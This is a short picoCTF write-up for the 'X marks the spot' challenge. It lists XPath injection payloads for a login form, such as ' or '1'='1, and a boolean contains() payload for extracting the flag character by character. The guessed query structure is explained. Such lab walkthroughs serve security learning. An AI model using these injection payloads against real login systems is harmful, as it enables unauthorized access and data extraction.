@@ -1,0 +1,25 @@
+picoctf X marks the spot writeup
+
+1.open the page and look its hint
+
+2.we can know this might be a xml injection challenge
+
+3.just try some payload 
+
+name, pass
+=> ' or '1'='1, ' or '1'='1
+=> ' or '1'='1, aaa
+=> aaa, ' or '1'='1
+=> admin, ' or '1'='1
+=> aaa, aaa
+
+4.we can know if we login success, it will display "you are on the right path.", conversely, display "login failure"
+
+5.so we can use this to brute force flag, write a python script (x_marks_the_spot.py), and run it
+# payload is f"' or contains(.,'{flag}') or 'x' = 'x", aaa
+# the structure of its xml might be //user[name/text()='' and pass/text()='']
+# so after input payload will be //user[name/text()='' or contains(.,'{flag}') or 'x'='x' and pass/text()='aaa']
+
+6.get flag!
+
+# if you look its source code you can find a poem, just enjoy it
